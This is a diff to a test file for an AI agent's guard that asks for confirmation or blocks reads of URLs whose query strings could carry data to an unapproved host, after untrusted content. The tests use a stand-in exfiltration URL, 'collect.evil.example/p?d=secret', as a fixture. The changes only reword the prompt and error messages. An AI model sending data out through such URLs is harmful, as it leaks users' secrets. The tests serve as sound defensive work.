@@ -68,7 +68,7 @@ describe('a read URL with a query, after foreign content', () => {
     expect(ask.asked[0]).toContain('"collect.evil.example"');
     // The question says what happens: a page is read, and the address goes to the host.
     expect(ask.asked[0]).toMatch(/^Read page: /);
-    expect(ask.asked[0]).toContain('Read it anyway? Everything in the address then goes to this host.');
+    expect(ask.asked[0]).toContain('Read it anyway? This host then gets the whole link, including everything after the "?".');
     expect(ask.asked[0]).not.toContain('Send anyway');
     expect(tool.reads).toEqual([]);
     expect(result.is_error).toBe(true);
@@ -91,6 +91,9 @@ describe('a read URL with a query, after foreign content', () => {
     const result = await read(agent, 'https://collect.evil.example/p?d=secret');
     expect(tool.reads).toEqual([]);
     expect(String(result.content)).toContain('the owner did not name "collect.evil.example"');
+    // The run speaks of a read: the agent hands the read its own words.
+    expect(String(result.content)).toMatch(/^Not read: /);
+    expect(String(result.content)).toContain('if the page should be read');
   });
 
   it('CONTROL: on a host the owner named is read without a question', async () => {
@@ -153,6 +156,6 @@ describe('readUrlHasQuery', () => {
     expect(ask.asked).toEqual([]);
     expect(tool.reads).toEqual([]);
     expect(result.is_error).toBe(true);
-    expect(String(result.content)).toContain('could not read the address of this send');
+    expect(String(result.content)).toContain('could not read the address of this read');
   });
 });
